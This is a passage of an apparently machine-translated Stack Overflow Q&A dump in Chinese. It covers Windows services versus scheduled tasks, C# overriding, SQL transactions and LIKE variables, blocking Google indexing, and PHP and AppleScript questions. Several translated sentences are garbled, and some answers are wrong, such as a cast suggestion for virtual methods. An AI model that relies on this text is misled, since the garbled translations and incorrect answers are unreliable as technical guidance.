> 时间：2010-05-24T04:22:29.677

这里有一些错误信息。Windows Scheduler 完全能够在后台运行任务而不会弹出窗口并且不需要密码。在 NT AUTHORITY\SYSTEM 帐户下运行它。使用这个 schtasks 开关：

> /ru 系统

但是，是的，对于访问网络资源，最佳实践是具有单独的永不过期密码策略的服务帐户。

**编辑**

根据您的操作系统和任务本身的要求，您可以通过该`/ru`选项使用权限低于 Localsystem 的帐户。

从精美的[手册](http://msdn.microsoft.com/en-us/library/bb736357.aspx)中，

```
/RU username

A value that specifies the user context under which the task runs. 
For the system account, valid values are "", "NT AUTHORITY\SYSTEM", or "SYSTEM". 
For Task Scheduler 2.0 tasks, "NT AUTHORITY\LOCALSERVICE", and 
"NT AUTHORITY\NETWORKSERVICE" are also valid values. 
```

[任务计划程序 2.0](http://msdn.microsoft.com/en-us/library/windows/desktop/aa446802)可从 Vista 和 Server 2008 获得。

在 XP 和 Server 2003 中，`system`是唯一的选择。

* * *

## 回答 #3

> 赞同：14
> 
> 时间：2011-11-22T09:02:34.590

在 .NET 开发中，我通常从开发控制台应用程序开始，它将运行所有日志输出到控制台窗口。但是，当它使用命令参数运行时，它*只是*`/console`一个控制台应用程序。当它在没有此参数的情况下运行时，它充当 Windows 服务，它将在我自己的自定义编码计划计时器上继续运行。

我认为，Windows 服务通常用于管理其他应用程序，而不是长时间运行的应用程序。或者 .. 它们是连续运行的重量级应用程序，例如 SQL Server、BizTalk、RPC 连接、IIS（即使 IIS 在技术上将工作卸载到其他进程）。

就个人而言，我更喜欢计划任务而不是 Window 服务，用于重复性维护任务和应用程序，例如文件复制/同步、批量电子邮件发送、文件删除或归档、数据更正（当其他解决方法不可用时）。

对于一个项目，我参与了 8 或 9 个 Windows 服务的开发，但这些服务位于内存中，处于空闲状态，每个实例占用 20MB 或更多内存。计划任务会做自己的事情，并立即释放内存。

* * *

## 回答 #4

> 赞同：13
> 
> 时间：2008-12-23T23:03:52.180

启动和退出应用程序的开销是多少？每两分钟很常见。与如此频繁地执行您的应用程序相比，一项服务可能会让系统运行更顺畅。

两种解决方案都可以在用户未登录时运行程序，因此没有区别。不过，编写服务比常规桌面应用程序更复杂——您可能需要一个单独的 GUI 客户端，该客户端将通过 TCP/IP、命名管道等与服务应用程序通信。

从一个用户的 POV 来看，我想知道哪个更容易控制。对于大多数非技术用户来说，服务和计划任务都几乎遥不可及，即他们甚至不会意识到它们的存在并且可以配置/停止/重新安排等等。

* * *

## 回答 #5

> 赞同：9
> 
> 时间：2013-08-01T12:44:10.833

“服务”一词与“服务器”有一些共同点。预计它将始终运行并“服务”。一个任务就是一个任务。

角色扮演。如果我是另一个操作系统、应用程序或设备并且我调用一个服务，我希望它正在运行并且我希望得到响应。如果我（os、app、dev）只需要执行一个孤立的任务，那么我将执行一个任务，但如果我希望进行通信，可能是双向通信，我想要一个服务。这与两件事情的最有效通信方式有关，或者一件事情想要执行一个任务。

然后是调度方面。如果您想在特定时间运行某些东西，请安排。如果您不知道何时需要它，或者“即时​​”需要它，请提供服务。

我的回答本质上更具哲学性，因为这与人类与他人互动和工作的方式非常相似。我们越了解沟通的艺术，“实体”越了解他们的角色，这个决定就越容易。

抛开所有哲学不谈，当你像我的 IT 部门经常做的那样“快速制作原型”时，你会做任何你必须做的事情来维持生计。一旦原型设计和概念验证的东西被排除在外，通常在早期的规划和发现中，你必须决定什么对长期可持续性更可靠。

好的，总而言之，它高度依赖于很多因素，但希望这提供了洞察力而不是混乱。

* * *

## 回答 #6

> 赞同：4
> 
> 时间：2008-12-23T23:02:52.947

Windows 服务不需要任何人登录，Windows 具有停止、启动和记录服务结果的功能。

计划任务不需要您学习如何编写 Windows 服务。

* * *

## 回答 #7

> 赞同：4
> 
> 时间：2008-12-23T23:05:20.570

1.  使用正确的权限设置和锁定 Windows 服务更容易。
2.  服务更加“可见”，这意味着每个人（即：技术人员）都知道去哪里寻找。

* * *

## 回答 #8

> 赞同：3
> 
> 时间：2016-07-23T22:31:29.370

这是一个老问题，但我想分享我所面临的。

最近我被要求捕获雷达的屏幕截图（来自气象网站）并每 10 分钟将其保存在服务器中。

这需要我使用 WebBrowser。我通常制作 Windows 服务，所以我决定也制作这项服务，但它会一直崩溃。这是我在事件查看器 **错误模块路径中看到的：C:\Windows\system32\MSHTML.dll**

由于任务很紧迫，而且我研究和实验的时间很少，所以我决定使用一个简单的控制台应用程序，并将其作为任务触发，并且执行得很顺利。

我真的很喜欢[Jon Galloway](http://weblogs.asp.net/jongalloway//428303)在 Mark Ransom 接受的答案中推荐的文章。

最近服务器上的密码在没有确认我的情况下被更改，并且所有服务都无法执行，因为它们无法登录。所以 ppl 在文章评论中声称这是一个问题。我认为 Windows 服务可能面临同样的问题（如果我错了请纠正我，我只是一个新手）

还有提到的事情，如果使用任务计划程序窗口弹出或控制台窗口弹出。我从来没有遇到过。它可能会弹出，但至少是非常瞬间的。

* * *

## 回答 #9

> 赞同：2
> 
> 时间：2008-12-23T23:51:34.813

为什么不两者都提供？

过去，我将“核心”位放入库中，并在服务和控制台应用程序中包装了对 What.GoGoGo() 的调用。

对于你每两分钟发射一次的东西，它的可能性不大（例如，只是一个“ping”类型的函数）。包装器不应该只包含一个方法调用和一些日志记录。

* * *

## 回答 #10

> 赞同：1
> 
> 时间：2019-03-18T15:08:45.780

通常，核心信息是并且应该是代码本身必须可以从每个“触发器/客户端”执行。因此，从一种方法切换到另一种方法不应该是火箭科学。

过去，我们或多或少总是使用 Windows 服务，但由于越来越多的客户逐步切换到 Azure，并且从控制台应用程序（作为计划任务部署）到 Azure 中的 WebJob 的交换比从一个 Windows 服务，我们现在专注于计划任务。如果我们遇到限制，我们只需启动 Windows 服务项目并从那里调用相同的逻辑（只要客户正在使用 OnPrem ..）:)

BR，是的

* * *

## 回答 #11

> 赞同：0
> 
> 时间：2017-10-17T07:08:44.997

在完成之前，Windows 服务需要更多的耐心。它的调试和安装有点困难。是面无表情 如果您需要每秒钟、每分钟或每小时必须完成的任务，您应该选择 Windows 服务。

计划任务发展迅速，有面子。如果您需要每日或每周任务，可以使用计划任务。

# c# - C# 在不知道它是子类实例的情况下调用重写的子类方法

> ID：390326
> 
> 赞同：4
> 
> 时间：2008-12-23T23:07:51.813
> 
> 标签：c#, inheritance, virtual, overriding, subclass

我有一个带有虚拟方法的基类，以及覆盖该方法的多个子类。

当我遇到其中一个子类时，我想调用被覆盖的方法，但不知道子类。我可以想出丑陋的方法来做到这一点（检查一个值并强制转换它），但似乎应该有一种语言内的方法来做到这一点。我希望列表在同一个列表中包含多个子类，否则显然我可以创建一个列表。

编辑：修复了代码中错误的注释，这导致我得到了非常合适的第一个答案:)

例如：

```
Class Foo 
{
    public virtual printMe()
    {
        Console.Writeline("FOO");
    }
}

Class Bar : Foo 
{
    public override printMe()
    {
        Console.Writeline("BAR");
    }
}

List<Foo> list = new List<Foo>();
// then populate this list with various 'Bar' and other overriden Foos

foreach (Foo foo in list) 
{
    foo.printMe(); // prints FOO.. Would like it to print BAR
} 
```

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2008-12-23T23:18:56.517

```
class Foo 
{
    public virtual void virtualPrintMe()
    {
        nonVirtualPrintMe();
    }

    public void nonVirtualPrintMe()
    {
        Console.Writeline("FOO");
    }
}

class Bar : Foo 
{
    public override void virtualPrintMe()
    {
        Console.Writeline("BAR");
    }
}

List<Foo> list = new List<Foo>();
// then populate this list with various 'Bar' and other overriden Foos

foreach (Foo foo in list) 
{
    foo.virtualPrintMe(); // prints BAR or FOO
    foo.nonVirtualPrintMe(); // always prints FOO
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2008-12-23T23:15:09.880

为什么要打印“Foo”？这不是虚方法的目的。关键是派生类可以在不改变接口的情况下改变函数的工作方式。Foo 对象将打印“Foo”，而 Bar 对象将打印“Bar”。其他任何事情都是错误的。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2008-12-23T23:18:01.463

使用**new**修饰符显式隐藏从基类继承的成员。要隐藏继承的成员，请在派生类中使用相同的名称声明它，并使用 new 修饰符对其进行修改。这将导致您想要的行为。

欲了解更多信息，请访问：http: [//geekswithblogs.net/Mohamed/articles/28613.aspx](http://geekswithblogs.net/Mohamed/articles/28613.aspx)

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2008-12-23T23:19:59.963

要在这种情况下获得您想要的行为，您可以删除基类上的 virtual 并在子类上使用 new 。

但是，就像 Ed Swangren 指出的那样，您为什么要这样做？

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2008-12-23T23:31:42.153

是否有一种解决方案，您只需将要调用的对象转换为另一个对象：

```
 foo.printMe(); // prints FOO.. Would like it to print BAR 
```

变成

```
(Foo)foo.printMe(); // foo can be any derived class of Foo. 
```

还是我错过了问题的某些部分？

# sql-server-2005 - SQLTransaction 和 T-SQL 事务

> ID：390354
> 
> 赞同：2
> 
> 时间：2008-12-23T23:21:24.280
> 
> 标签：sql-server-2005, tsql, transactions, rollback

我使用的是 .NET 2.0 和 SQL Server 2005。由于历史原因，应用程序代码使用 SQLTransaction，但一些存储过程也使用 T-SQL begin/commit/rollback tran 语句。这个想法是 DBTransaction 可以跨越许多存储过程，每个单独的 sproc 控制在其范围内发生的事情 - 实际上这些是嵌套事务。

代码的旧行为是，如果任何存储过程失败，应用程序逻辑也会导致外部 SQLTransaction 也回滚。但是现在我们想改变逻辑，这样，即使出现故障，外部事务也应该继续按顺序执行剩余的存储过程，最后，由于我们知道有故障，我们回滚整个 SQLTransaction。

问题在于，至少就目前的编码而言，如果任何存储过程执行 ROLLBACK，外部 SQLTransaction 似乎会丢失其连接，因此任何后续重用事务的尝试都会失败。有没有办法可以在 T-SQL 中回滚但仍保持外部 SQLTransaction？我在想也许保存点在这里可能会有所帮助，但我还不太了解它们。

使这种情况复杂化的是，并不总是有外部事务，所以我不能只删除 T-SQL 回滚，即。有时，sproc 会自行执行；有时在交易的背景下。

切换到 TransactionScope 会让事情变得更容易吗？

感谢您的任何建议......迈克

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2008-12-23T23:44:50.507

看看这个知识库条目：

[发生数据源错误后提交或回滚事务时可能会出现意外异常](http://support.microsoft.com/default.aspx?scid=kb;en-us;Q309335)

在存储过程中回滚事务将导致 ADO.NET 客户端中的任何“外部”事务消失。唯一的解决方案是将您的 Rollback() 调用包装在 try/catch 块中。如果发生这种情况，我认为不可能维持外部交易。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2008-12-23T23:55:08.877

我建议您考虑将外部事务也放在存储过程中，以便在 TSQL 中维护所有嵌套（使用 EXEC 调用其他存储过程）。SQL Server 是一个非常丰富的开发/数据管理环境，它允许您以 ADO 笨拙地处理的方式来管理您的事务。还要记住，在存储过程中将一堆 SQL 组合在一起几乎总是比通过 ADO 连接进行多次调用更有效。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2008-12-26T06:23:10.403

您可能会感兴趣查看[IMPLICIT_TRANSACTION](http://msdn.microsoft.com/en-us/library/ms187807.aspx)基本上有了这个，您可以更改存储过程的事务相关模式。在许多情况下，这是一个更简单的解决方案。

# security - 表单发布到自己的文件还是不同的文件在安全性上会有所不同吗？

> ID：390359
> 
> 赞同：2
> 
> 时间：2008-12-23T23:24:04.603
> 
> 标签：security, http, forms, post

假设我在任何一种情况下都进行相同的字段验证，那么无论您将表单发布回自己的文件还是另一个文件，在安全性方面是否有任何区别？

请注意，我指的不是表单数据中的敏感信息或密码，而是指任何一种方法是否能更好地避免各种类型的攻击。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2008-12-23T23:27:45.423

它没有任何区别。接受表单输入的页面不知道数据来自哪里（HTTP 引荐来源网址很容易被欺骗），任何安全工作都取决于与表单数据来自的页面完全无关的事情。

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2008-12-24T00:19:19.860

实际上它确实有所不同——主要是因为如果你发回它自己，它不会创建一个新的历史条目，但是如果你发布到一个不同的页面，它确实会在浏览器中创建一个新的历史条目。这主要对公共终端和记住表单内容的浏览器感兴趣。

1.  填写表格
2.  提交
3.  离开电脑
4.  邪恶的人点击后退按钮并阅读表单的内容。

我还认为要完全防止这种攻击，您需要进行 301 重定向。那就是您发布到 url，并且 url 以 301 响应将您发送回原始页面。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2008-12-23T23:25:20.763

如果它们都是您服务器上的文件，在您的控制之下，那么它没有任何区别。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2008-12-24T00:15:17.340

不，这根本不重要。您所做的只是向 URL 发送 HTTP 请求。您的服务器处理请求并将响应发送回用户。如果响应恰好与发送请求的页面相同，则不会使应用程序更加安全或容易受到任何类型的 HTTP 攻击。

# sql-server - 在 SQL LIKE 语句中使用变量

> ID：390362
> 
> 赞同：67
> 
> 时间：2008-12-23T23:26:24.457
> 
> 标签：sql-server

我有一个存储过程（MSSQL 2k5），它将为 LIKE 子句获取一个变量，如下所示：

```
DECLARE @SearchLetter2 char(1)
SET @SearchLetter = 't'
SET @SearchLetter2 = @SearchLetter + '%'
SELECT *
    FROM BrandNames 
    WHERE [Name] LIKE @SearchLetter2 and IsVisible = 1 
    --WHERE [Name] LIKE 't%' and IsVisible = 1 
    ORDER BY [Name] 
```

不幸的是，当前运行的行会引发语法错误，而注释的 where 子句运行得很好。谁能帮我让未注释的行正常工作？

* * *

## 回答 #1

> 赞同：103
> 
> 时间：2012-10-01T15:56:32.063

如果您使用的是存储过程：

```
ALTER PROCEDURE <Name>
(
    @PartialName VARCHAR(50) = NULL
)

SELECT Name 
    FROM <table>
    WHERE Name LIKE '%' + @PartialName + '%' 
```

* * *

## 回答 #2

> 赞同：22
> 
> 时间：2008-12-23T23:39:10.203

Joel 是不是 @SearchLetter 还没有被声明？@SearchLetter2 的长度对于 't%' 来说也不够长。尝试更长的 varchar。

* * *

## 回答 #3

> 赞同：18
> 
> 时间：2013-05-19T16:04:28.390

正如安德鲁·布劳尔所说，但添加了一个修剪

```
ALTER PROCEDURE <Name>
(
    @PartialName VARCHAR(50) = NULL
)

SELECT Name 
    FROM <table>
    WHERE Name LIKE '%' + LTRIM(RTRIM(@PartialName)) + '%' 
```

* * *

## 回答 #4

> 赞同：8
> 
> 时间：2013-05-06T20:10:54.277

但在我看来，一件重要的事情。

“char(number)”是可变的长度。

如果我们有一个带有“名称”的表，例如 [Test1..Test200]，我们在 SELECT 中声明 char(5)，如：

```
DECLARE @variable char(5)
SET @variable = 'Test1%'
SELECT * FROM table WHERE Name like @variable 
```

结果将只有 - “Test1”！（char(5) - 长度为 5 个字符；Test11 为 6）

结果中不会返回其他潜在感兴趣的数据，例如 [Test11..Test200]。

如果我们想通过这种方式限制 SELECT 是可以的。但是，如果它不是故意的，它可能会从计划中返回不正确的结果（例如“所有以 Test1 开头的名称...”）。

在我看来，如果我们不知道 SELECTed 值的精确长度，更好的解决方案可能是这样的：

```
DECLARE @variable varchar(max)
SET @variable = 'Test1%'
SELECT * FROM <table> WHERE variable1 like @variable 
```

这将返回（Test1 以及 Test11..Test19 和 Test100..Test199）。

* * *

## 回答 #5

> 赞同：5
> 
> 时间：2008-12-23T23:41:04.927

这适用于 Northwind 示例数据库，请注意 SearchLetter 有 2 个字符，并且还必须声明 SearchLetter 才能运行：

```
declare @SearchLetter2 char(2)
declare @SearchLetter char(1)
Set @SearchLetter = 'A'
Set @SearchLetter2 = @SearchLetter+'%'
select * from Customers where ContactName like @SearchLetter2 and Region='WY' 
```

* * *

## 回答 #6

> 赞同：4
> 
> 时间：2008-12-23T23:40:40.763

声明@SearchLetter2 char(1)

将此设置为更长的字符。

* * *

## 回答 #7

> 赞同：3
> 
> 时间：2012-06-26T15:20:26.697

我们也可以直接写...

```
DECLARE @SearchLetter CHAR(1) 

SET @SearchLetter = 'A' 

SELECT * 
FROM   CUSTOMERS 
WHERE  CONTACTNAME LIKE @SearchLetter + '%' 
       AND REGION = 'WY' 
```

或者如果我们必须附加所有搜索字符，那么也可以使用以下方式，

```
DECLARE @SearchLetter CHAR(1) 

SET @SearchLetter = 'A' + '%' 

SELECT * 
FROM   CUSTOMERS 
WHERE  CONTACTNAME LIKE @SearchLetter 
       AND REGION = 'WY' 
```

这两个都行

* * *

## 回答 #8

> 赞同：2
> 
> 时间：2019-10-08T12:41:51.660

我在 LIKE 中使用局部变量也有问题。
重要的是要知道：**variable 有多长**。
下面，**ORDER_NO**是**50 个**字符长，所以你不能使用：*LIKE @ORDER_NO*，因为最后会是空格。
您需要先修剪变量的右侧。
像这样：

```
DECLARE @ORDER_NO char(50)
SELECT @ORDER_NO = 'OR/201910/0012%'

SELECT * FROM orders WHERE ord_no LIKE RTRIM(@ORDER_NO) 
```

* * *

## 回答 #9

> 赞同：1
> 
> 时间：2018-09-27T00:58:52.320

它可能就像输入变量`LIKE '%%[%3]%%'`一样简单。`[%3]`

这适用于 SAP B1 9.1

# c# - 如何使用 WPF 构建一个简单的源代码编辑器？

> ID：390365
> 
> 赞同：2
> 
> 时间：2008-12-23T23:27:46.483
> 
> 标签：c#, wpf, text-editor

你好，圣诞快乐！

我是 WPF 的新手，我正在尝试为汇编语言构建一个文本编辑器。汇编器为我提供了两个列表：

*   错误列表
*   警告列表

我的编辑器应该能够导入文件的内容并将其显示在文本面板中。我希望它类似于 Visual Studio。行号在旁边。以及用于警告/错误消息的选项卡式窗格。

每个列表元素都包含作为 Int 的行号和包含错误/警告消息的 String。（如果我可以在选项卡式窗格中单击它，它会跳转到该行并突出显示它，那将是非常酷的。）

我怎么说我是 WPF 的新手，我不知道控件库，我没有太多时间去挖掘和与谷歌友好。

因此，如果有人能指出我至少需要开发 GUI 的控件，我将不胜感激。

我最好的问候，约翰

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2009-10-15T16:10:22.110

免费一个[http://blog.bodurov.com/Wpf-Source-Code-Editor](http://blog.bodurov.com/Wpf-Source-Code-Editor)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2008-12-23T23:37:59.740

我为您提供的只是两个链接：

*   [CodeyProject](http://www.codeproject.com/KB/WPF/WPFdockinglib.aspx)
*   [商业一号（SandDock）](http://www.divelements.co.uk/net/controls/sanddockwpf/)

* * *

## 回答 #3

> 赞同：-1
> 
> 时间：2009-06-01T19:48:38.140

我们用于 WPF 控件的 SyntaxEditor 上周刚刚向公众发布。它是一个语法高亮代码编辑器控件，类似于 Visual Studio 2010 编辑器。您可以在此处找到有关该控件的更多信息：www.actiprosoftware.com/Products/DotNet/WPF/SyntaxEditor/

# google-index - 阻止 Google 编制索引

> ID：390368
> 
> 赞同：72
> 
> 时间：2008-12-23T23:29:28.010
> 
> 标签：google-index

有没有办法阻止谷歌索引一个网站？

* * *

## 回答 #1

> 赞同：107
> 
> 时间：2008-12-23T23:32:23.527

机器人.txt

```
User-agent: *
Disallow: / 
```

这将阻止所有搜索机器人编制索引。

有关详细信息，请参阅： [http ://www.google.com/support/webmasters/bin/answer.py?hl=en&answer=40360](http://www.google.com/support/webmasters/bin/answer.py?hl=en&answer=40360)

* * *

## 回答 #2

> 赞同：91
> 
> 时间：2014-02-11T00:33:00.827

我必须在这里添加我的答案，因为接受的答案并没有真正正确地解决问题。另请记住，阻止 Google 抓取并不意味着您可以将内容保密。

我的回答基于几个来源：[https ://developers.google.com/webmasters/control-crawl-index/docs/getting_started](https://developers.google.com/webmasters/control-crawl-index/docs/getting_started) [https://sites.google.com/site/webmasterhelpforum/en/faq--crawling- -索引---排名](https://sites.google.com/site/webmasterhelpforum/en/faq--crawling--indexing---ranking)

`robots.txt`文件控制抓取，但不索引！这两个是完全不同的动作，分别执行。有些页面可能被爬取但没有被索引，有些甚至可能被索引[但从未被爬取](https://sites.google.com/site/webmasterhelpforum/en/faq--crawling--indexing---ranking#dont-index)。未爬取页面的链接可能存在于其他网站，这将使谷歌索引器跟踪它，并尝试索引。

问题是关于索引，它正在收集有关页面的数据，因此它可以通过搜索结果获得。可以阻止添加元标记：

```
<meta name="robots" content="noindex" /> 
```

或将 HTTP 标头添加到响应中：

```
X-Robots-Tag: noindex 
```

如果问题是关于爬行，那么您当然可以创建`robots.txt`文件并输入以下行：

```
User-agent: *
Disallow: / 
```

抓取是为收集有关特定网站结构的信息而执行的操作。例如，您通过 Google 网站管理员工具添加了网站。爬虫会考虑到它，并访问您的网站，搜索`robots.txt`. 如果它没有找到任何东西，那么它将假设它可以抓取任何东西（拥有`sitemap.xml`文件也非常重要，以帮助进行此操作，并指定优先级并定义更改频率）。如果它找到文件，它将遵循规则。成功抓取后，它会在某个时候为抓取的页面运行索引，但你不知道什么时候......

**重要提示**：这一切都意味着您的网页仍然可以显示在 Google 搜索结果中`robots.txt`。

我希望至少有一些用户会阅读这个答案并清楚地知道，因为了解实际发生的情况至关重要。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2018-09-04T13:06:05.430

有几种方法可以阻止爬虫，包括谷歌停止爬取和索引您的网站。

**在服务器级别通过标头**

```
Header set X-Robots-Tag "noindex, nofollow" 
```

**在根域级别通过 robots.txt 文件**

```
User-agent: *
Disallow: / 
```

**通过机器人元标记在页面级别**

```
<meta name="robots" content="nofollow" /> 
```

但是，我必须说，如果您的网站已经过时而不是现有页面/网址，那么您应该等待某个时间谷歌会在下次抓取时自动取消这些网址的索引 - 阅读[https://support.google.com/webmasters/answer/1663419?hl =zh](https://support.google.com/webmasters/answer/1663419?hl=en)

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2016-11-26T22:42:08.723

您可以通过在 apache conf 中全局添加以下设置来禁用此服务器范围，或者可以在 vhost 中使用相同的参数仅对特定 vhost 禁用它。

> 标题集 X-Robots-Tag “noindex, nofollow”

完成此操作后，您可以通过验证返回的 apache 标头来对其进行测试。

> curl -I staging.mywebsite.com HTTP/1.1 302 发现日期：2016 年 11 月 26 日星期六 22:36:33 GMT 服务器：Apache/2.4.18 (Ubuntu) 位置：/pages/ X-Robots-Tag：noindex，nofollow内容类型：文本/html；字符集=UTF-8

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2011-09-21T16:33:17.197

请记住，尽管微软声称遵守 robots.txt，但微软的必应爬虫并不总是这样做。

我们的服务器统计数据表明，他们有许多 IP 运行不遵守 robots.txt 的爬虫，也有一些运行不遵守 robots.txt 的爬虫。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2011-09-22T15:39:12.453

我使用一个简单的 aspx 页面将结果从谷歌中继到我的浏览器，使用一个虚假的“Pref”cookie 一次获得 100 个结果，我不想让谷歌看到这个中继页面，所以我检查了 IP 地址，如果它开始使用 66.249 然后我只需进行重定向。

如果您重视隐私并想要一份副本，请单击我的名字。

我使用的另一个技巧是让一些 javascript 调用页面以在会话中设置标志，因为大多数（不是全部）网络机器人不执行 javascript，所以你知道它是关闭了 javascript 的浏览器，或者是更多一个机器人。

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2012-11-02T21:36:43.323

您也可以通过这种方式添加元机器人：

```
<head>
<title>...</title>
<META NAME="ROBOTS" CONTENT="NOINDEX, NOFOLLOW">
</head> 
```

另一个额外的层是修改.htaccess，但你需要深入检查它。

* * *

## 回答 #8

> 赞同：0
> 
> 时间：2013-03-27T11:02:16.310

使用 nofollow 元标记：

```
<meta name="robots" content="nofollow" /> 
```

要在链接级别指定 nofollow，请将值为 nofollow 的属性 rel 添加到链接：

```
<a href="example.html" rel="nofollow" /> 
```

* * *

## 回答 #9

> 赞同：0
> 
> 时间：2017-11-20T08:51:23.840

> 有没有办法阻止谷歌索引一个网站？

要阻止 Google 抓取，只需将以下`meta`标签添加到`head`每个页面：

```
<meta name="googlebot" content="noindex, nofollow"> 
```

# asp.net - 如何制作完全可定制的托管 ASP.NET MVC 应用程序

> ID：390370
> 
> 赞同：1
> 
> 时间：2008-12-23T23:30:25.713
> 
> 标签：asp.net, asp.net-mvc

这与我之前关于提供静态 html 文件的问题有关，但这似乎不是一个好的解决方案，

我想将一个完全可定制的 ASP.NET MVC 应用程序作为托管服务。请参阅允许用户自定义他们自己页面的外观/感觉，但它仍然是动态的，这意味着数据托管在中央数据库中。

我查看了 ASP.NET 中的“主题”或“皮肤”，但我认为它的可定制性不够。似乎只有开发人员可以添加新主题。我想在 WordPress 中拥有类似主题编辑器的东西，这样您就可以从基于 Web 的界面中随意更改外观。

我想知道如何为流行的博客平台存储主题文件？它们是存储在数据库中还是文件系统中的文件中？我更喜欢将它存储在数据库中，因为如果它在文件系统中，它将有可伸缩性问题。每个用户都会对特定的 Web 服务器感到厌烦，我必须确定每个 Web 服务器有多少磁盘空间。

我想过做一些类似旧的 MovableType 的事情，以便在添加新帖子时生成静态 HTML。这个解决方案也是有问题的，因为灵活性取决于模板引擎的复杂性。

想法？建议？

谢谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2010-08-17T03:59:18.777

“完全可定制”是白鲸中最难以捉摸的 ;-)

我看到您的问题已经过时了，但仍然如此；首先，我建议定义一些**非常**清晰
且有凝聚力的规则，以管理“底线”是什么，或者某种可继承的模板。
我猜你对开发过程中可能有用的东西有一个很好的印象。

下一个; 定制应该呈现和实现什么以及如何实现？

继承 ASP.NET 自定义 custard、Web 部件需要相当多的哄骗才能在 MVC 视图中表现：
[https ://stackoverflow.com/questions/1106629/using-webparts-in-an-mvc-application](https://stackoverflow.com/questions/1106629/using-webparts-in-an-mvc-application/)

如果您更倾向于可定制的外观（主题和皮肤），
那么为每个用户创建一个 CSS 文件怎么样，保存为 VARCHAR(MAX) 的魅力，并且可以很容易地插入到您的母版页的头部。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2008-12-26T22:56:10.507

WordPress 中的主题编辑器只允许您编辑主题 PHP 文件...您可以像在 wordpress 中一样执行此操作，但您的主题不是编辑 PHP 文件，而是由一组没有代码隐藏的 aspx\ascx 文件组成...

# .net - 在 CF.NET 2.0 中播放 WMA 文件

> ID：390372
> 
> 赞同：1
> 
> 时间：2008-12-23T23:31:15.383
> 
> 标签：.net, compact-framework, audio

我正在使用[Microsoft](http://msdn.microsoft.com/en-us/library/ms229685(VS.80).aspx)的此代码为我的应用程序播放音频通知。当用户选择 wav 文件时它工作正常，但当他们选择 wma 文件时它不会播放。

有什么方法可以支持 wma 文件吗？很多内置的闹钟和铃声似乎都是 wma。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2008-12-27T06:06:31.340

看看[Windows Media Player 控件](http://msdn.microsoft.com/en-us/library/ms930695.aspx)。

根据文档，您应该能够播放 WMA 文件。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2009-01-11T16:05:38.140

为了再次回答我自己的问题，我发现在 WM6 中使用以下工作： [DllImport("aygshell.dll")] internal static extern uint SndPlaySync(string file, uint flags);

不过，这在 WM5 中不起作用，所以我回退到在那里播放 wav 文件的旧方法。

# php - 在 PHP 中锁定类成员

> ID：390375
> 
> 赞同：0
> 
> 时间：2008-12-23T23:31:48.130
> 
> 标签：php, oop, class

在 PHP 中，如果您定义一个类，然后实例化该类的一个对象，则以后可以任意向该类添加新成员。例如：

```
class foo {
    public $bar = 5;
}

$A = new foo;
$A->temp = 10; 
```

但是，我希望能够以这种方式添加新成员。基本上我希望该类仅具有其定义中指定的成员；如果您尝试设置任何其他成员，则会出现致命错误。这里的意图是我想将一个类定义为一组非常具体的属性，并确保类中仅存在这些属性，以便类内容定义明确并且以后不能更改（每个成员的值可以改变，但不能改变成员本身）。

我意识到我可以使用 __set 方法来做到这一点，如果您尝试设置一个尚不存在的成员，则会出现致命错误，但是必须在每个类定义中包含这很烦人（尽管我可以定义我的每个使用该方法扩展基类的类，但这也很烦人）。例如：

```
class foo {
    public $bar = 5;

    private function __set($var, $val) {
        trigger_error("Cannot dynamically add members to a class", E_USER_ERROR);
    }
} 
```

有没有其他（最好更方便）的方法来做到这一点？除了修改 PHP 本身以禁止这种行为之外？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2008-12-23T23:54:51.110

没有。没有比`__set`使用基类更好的方法了。这是一个已知问题，[计划在未来解决](http://wiki.php.net/todo/php53)：

> 引入不允许动态属性创建的“严格类”的概念

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2008-12-23T23:39:50.657

不，只有__set。也许您可以使用继承来避免到处重写它。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2008-12-23T23:35:00.913

我不得不问你为什么需要这样做？如果分配了成员但不存在，则不会影响方法，如果它是私有的，则会引发错误。那么为什么你需要这样做，或者我完全误读了这个问题？

# applescript - 如何使用applescript打开电子邮件？

> ID：390381
> 
> 赞同：5
> 
> 时间：2008-12-23T23:32:38.860
> 
> 标签：applescript, email

我正在编写一个小applescript，它检索查看器中的所有“未读”消息并循环它们。

我有两个目标要完成：

1.  我需要获取每条消息的主题并执行正则表达式以查看它是否适合第 2 步（例如：获取主题为 {.*} 的电子邮件）

2.  我需要在单独的窗口中打开每条消息，4 秒后，我需要关闭该窗口并继续处理下一条消息

你知道怎么做这些吗？

提前致谢。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2008-12-24T01:08:28.323

以下applescript适用于我，但我不确定如何进行正则表达式匹配。您可以将 unix 'grep' 函数与 applescript 的 ' `do shell script`' 命令一起使用，但我不是如何正确使用 grep 的专家。我把这个留给别人来回答。

```
 on run
    tell application "Mail"
        set myInbox to mailbox "INBOX" of account 1
        set myMessages to every message of myInbox

        repeat with theMessage in myMessages
            if read status of theMessage is false then

                if my subjectIsInteresting(subject of theMessage) then
                    open theMessage
                    delay 4
                    close window 1
                end if

            end if
        end repeat

    end tell
end run

on subjectIsInteresting(subject)

    -- do some regex magic here

    return true -- for now

end subjectIsInteresting 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2009-06-19T02:13:42.170

